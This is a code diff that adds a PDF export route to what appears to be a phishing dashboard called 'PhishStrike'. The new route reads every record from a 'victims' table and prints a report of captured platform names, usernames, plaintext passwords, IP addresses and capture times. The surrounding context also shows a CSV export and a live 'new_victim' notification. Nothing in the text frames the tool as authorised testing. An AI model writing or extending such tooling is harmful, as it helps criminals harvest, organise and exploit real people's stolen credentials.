@@ -102,6 +102,68 @@ def export_csv():
         return jsonify({"status": "error", "message": str(e)}), 500
 
 
+@app.route("/api/export_pdf")
+def export_pdf():
+    try:
+        from fpdf import FPDF
+
+        victims = database.get_all_victims()
+
+        class PDF(FPDF):
+            def header(self):
+                self.set_font("Helvetica", "B", 16)
+                self.set_text_color(0, 242, 255)  # Cyan
+                self.cell(0, 10, "PHISHSTRIKE INTELLIGENCE REPORT", 0, 1, "C")
+                self.set_font("Helvetica", "I", 10)
+                self.set_text_color(128, 128, 128)
+                self.cell(0, 10, f"Generated on: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", 0, 1, "C")
+                self.ln(10)
+
+            def footer(self):
+                self.set_y(-15)
+                self.set_font("Helvetica", "I", 8)
+                self.set_text_color(128, 128, 128)
+                self.cell(0, 10, f"Page {self.page_no()} | PhishStrike Advanced Dashboard", 0, 0, "C")
+
+        pdf = PDF()
+        pdf.set_auto_page_break(auto=True, margin=15)
+        pdf.add_page()
+        pdf.set_font("Helvetica", "B", 10)
+
+        # Table Header
+        pdf.set_fill_color(30, 41, 59)  # Dark Blue-Gray
+        pdf.set_text_color(255, 255, 255)
+        pdf.cell(10, 10, "ID", 1, 0, "C", True)
+        pdf.cell(25, 10, "Platform", 1, 0, "C", True)
+        pdf.cell(40, 10, "Username", 1, 0, "C", True)
+        pdf.cell(40, 10, "Password", 1, 0, "C", True)
+        pdf.cell(30, 10, "IP Address", 1, 0, "C", True)
+        pdf.cell(45, 10, "Captured At", 1, 1, "C", True)
+
+        # Table Rows
+        pdf.set_font("Helvetica", "", 9)
+        pdf.set_text_color(0, 0, 0)
+        pdf.set_fill_color(248, 250, 252)
+        
+        fill = False
+        for v in victims:
+            pdf.cell(10, 10, str(v[0]), 1, 0, "C", fill)
+            pdf.cell(25, 10, str(v[1]), 1, 0, "C", fill)
+            pdf.cell(40, 10, str(v[2])[:20], 1, 0, "L", fill)
+            pdf.cell(40, 10, str(v[3])[:20], 1, 0, "L", fill)
+            pdf.cell(30, 10, str(v[4]), 1, 0, "C", fill)
+            pdf.cell(45, 10, str(v[5]), 1, 1, "C", fill)
+            fill = not fill
+
+        buf = io.BytesIO(pdf.output())
+        filename = f"phishstrike_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
+        return send_file(buf, as_attachment=True, download_name=filename, mimetype="application/pdf")
+    except ImportError:
+        return jsonify({"status": "error", "message": "fpdf2 not installed"}), 500
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
 def notify_new_victim(data):
     socketio.emit("new_victim", data)
 
